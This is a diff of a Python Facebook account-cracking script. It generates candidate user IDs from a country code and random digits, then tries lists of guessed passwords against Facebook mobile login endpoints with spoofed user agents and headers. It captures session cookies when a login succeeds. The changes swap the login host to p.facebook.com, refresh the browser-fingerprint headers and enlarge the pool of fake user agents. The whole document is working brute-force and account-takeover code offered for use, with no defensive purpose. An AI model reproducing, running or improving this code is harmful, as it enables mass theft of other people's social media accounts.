@@ -122,14 +122,8 @@ header_grup = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac O
 bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
 done = False
 
-ua = "[FBAN/FB4A;FBAV/69.0.0.3201;FBBV/874034155;FBDM/{density=2.0113,width=720,height=1240};FBLC/en_US;FBRV/874034155;FBCR/PTCL;FBMF/INFINIX MOBILE LIMITED;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X687;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
-ua = "[FBAN/FB4A;FBAV/74.0.0.2101;FBBV/463572925;FBDM/{density=2.0113,width=720,height=1240};FBLC/en_US;FBRV/463572925;FBCR/grameenphone;FBMF/INFINIX MOBILE LIMITED;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X652A;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
-ua = "[FBAN/FB4A;FBAV/14.0.0.5001;FBBV/648586211;FBDM/{density=2.0113,width=720,height=1240};FBLC/en_US;FBRV/648586211;FBCR/Jazz;FBMF/INFINIX MOBILE LIMITED;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X652C;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
-ua = "[FBAN/FB4A;FBAV/440.0.0.55.118;FBBV/446812233;FBDM/{density=2.0113,width=720,height=1240};FBLC/en_US;FBRV/446812233;FBCR/Airtel;FBMF/INFINIX MOBILE LIMITED;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X672;FBSV/12;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
-ua = "[FBAN/FB4A;FBAV/349.0.0.40.120;FBBV/309617247;FBDM/{density=2.0113,width=720,height=1240};FBLC/en_US;FBRV/309617247;FBCR/Airtel;FBMF/TECNO MOBILE LIMITED;FBBD/tecno;FBPN/com.facebook.katana;FBDV/TECNO_KG6;FBSV/11;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
-ua = "[FBAN/FB4A;FBAV/257.0.0.24.120;FBBV/204614705;FBDM/{density=2.0113,width=720,height=1240};FBLC/en_US;FBRV/204614705;FBCR/Airtel;FBMF/SAMSUNG MOBILE LIMITED;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SAMSUNG_SCV37;FBSV/9;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
 ugen=[]
-for x in range(5000):
+for x in range(10000):
     aa='Mozilla/5.0 (Linux; U; Android'
     b=random.choice(['6','7','8','9','10','11','12'])
     c=' en-us; GT-'
@@ -233,7 +227,7 @@ def RJ_SN():
         print('\033[1;92mIF ID NOT COME TURN ON AIRPLNE')
         linex()
         for love in user:
-            pwx = [love[2:],love,code+love,code+love[:3],'jannat','sumaiya','sadiya','mehedi','sabbir','i love you','bangladesh','bangla']
+            pwx = [love[2:],love,code+love,code+love[:3],'jannat','sumaiya','sadiya','mehedi','sabbir','bangladesh','bangla']
             uid = code+love
             manshera.submit(rcrack,uid,pwx,tl)
     print('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;90mCRACK PROCESS HAS BEEN COMPLETED ')
@@ -261,27 +255,27 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {"authority": 'free.facebook.com',
-            "method": 'GET',
-            "scheme": 'https',
-            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
-            "accept-encoding": 'gzip, deflate, br',
-            "accept-language": 'en-US,en;q=1',
-            'cache-control': 'no-cache, no-store, must-revalidate',
-            "referer": 'https://web.facebook.com/',
-            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
-            "sec-ch-ua-mobile": '?0',
-            "sec-ch-ua-platform": "Android",
+            header_freefb = {"authority": 'p.facebook.com',
+           "method": 'GET',
+           "scheme": 'https',
+            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            "accept-language": 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
+            "cache-control": 'max-age=0',
+            "dpr": '1.600000023841858',
+            "sec-ch-prefers-color-scheme": 'dark',
+            "sec-ch-ua": '"Not)A;Brand";v="24", "Chromium";v="116"',
+            "sec-ch-ua-full-version-list": '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
+            "sec-ch-ua-mobile": '?1',
+            "sec-ch-ua-model": '"TECNO KE7"',
+            "sec-ch-ua-platform": '"Android"',
+            "sec-ch-ua-platform-version": '"10.0.0"',
             "sec-fetch-dest": 'document',
             "sec-fetch-mode": 'navigate',
-            "sec-fetch-site": 'same-origin',
+            "sec-fetch-site": 'none',
             "sec-fetch-user": '?1',
-            "pragma": 'no-cache',
-            "priority": 'u=1',
-            'cross-origin-resource-policy': 'cross-origin',
             "upgrade-insecure-requests": '1',
             "user-agent": pro}
-            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+            lo = session.post('https://p.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
